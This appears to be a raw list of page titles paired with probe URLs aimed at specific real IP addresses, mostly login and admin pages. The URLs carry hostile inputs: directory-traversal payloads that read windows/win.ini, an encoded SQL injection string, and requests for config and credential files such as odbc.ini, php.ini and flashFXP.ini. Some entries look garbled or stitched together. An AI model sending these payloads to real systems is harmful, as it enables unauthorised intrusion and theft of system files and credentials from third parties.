WhatsUp,http://210-242-148-168.hinet-ip.hinet.net/tmp/comments/enc/log/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
3300,http://210.200.17.156/login/.br/gs/enc/odbc.ini
porter2/full.ini at master - GitHub,https://github.com/markfullmer/porter2/blob/master/test/Datasets/full.ini
"\""System - Employee Intranet Login",http://210.242.145.173/login/default.asp/log/preferences.ini
PHProjekt,http://61.64.230.170/login/perl/ventrilo_srv.ini
"\""newsletter",http://61.64.230.186/login/opac.bas-net.by/opacpage/include/flashFXP.ini
"\""FTP",http://210.242.149.143/login-us/preferences.ini
network administration,http://210.242.147.137/login/.br/webmail./-1%2520OR%25202%2B90-90-1%3D0%2B0%2B0%2B1%2520--%2520.ini
switch login - Password,http://210.203.16.149/loginok/ovcgi/................windows/win.ini
ePowerSwitch,http://210.242.148.131/login/control/admin/php.ini
